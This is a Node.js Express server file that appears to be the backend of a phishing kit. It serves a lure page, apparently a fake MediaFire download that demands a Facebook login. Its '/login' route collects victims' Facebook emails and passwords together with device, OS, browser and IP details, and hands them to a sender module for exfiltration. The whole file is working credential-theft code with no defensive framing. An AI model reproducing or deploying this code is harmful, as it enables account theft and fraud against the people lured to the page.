require('dotenv').config();
const express = require('express');
const path = require('path');
const useragent = require("express-useragent");
const requestIp = require("request-ip");
const send = require('./src/utils/sender.js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(useragent.express());
app.use(requestIp.mw());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'src', 'views', 'index.html'));
});

app.get('/config', (req, res) => {
  res.sendFile(path.join(__dirname, 'src', 'data', 'config.json'));
});

// Login Facebook
app.post('/login', (req, res) => {
  const {
    emailFacebook,
    passwordFacebook,
    modelInfoFb,
    platformInfoFb,
    versiInfoFb,
    logFacebook,
  } = req.body;

  const userAgent = req.useragent;

  const emVal = emailFacebook || 'Unknown';
  const passVal = passwordFacebook || 'Unknown';
  const device = `${modelInfoFb} ${platformInfoFb} ${versiInfoFb}` || 'Unknown';
  const os = userAgent.os || "Unknown";
  const browser = userAgent.browser || "Unknown";
  const ipAddress = req.clientIp || "Unknown";
  const logVia = logFacebook || "Unknown";

//   console.log(`
// ======== RESULT MEDIAFIRE ========
// Login       : ${logVia}
// Email       : ${emVal}
// Password    : ${passVal}
// Device      : ${device}
// OS          : ${os}
// Browser     : ${browser}
// IP Address  : ${ipAddress}
//   `);
  
   send({emVal, passVal, device, os, browser, ipAddress, logVia});
   res.sendStatus(200);
});

// 404 file not found
app.use((req, res) => {
  res.status(404).redirect('/');
});

// Error global
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Terjadi kesalahan server.');
});

// Start server
app.listen(PORT, () => {
  console.log(`http://localhost:${PORT}`);
});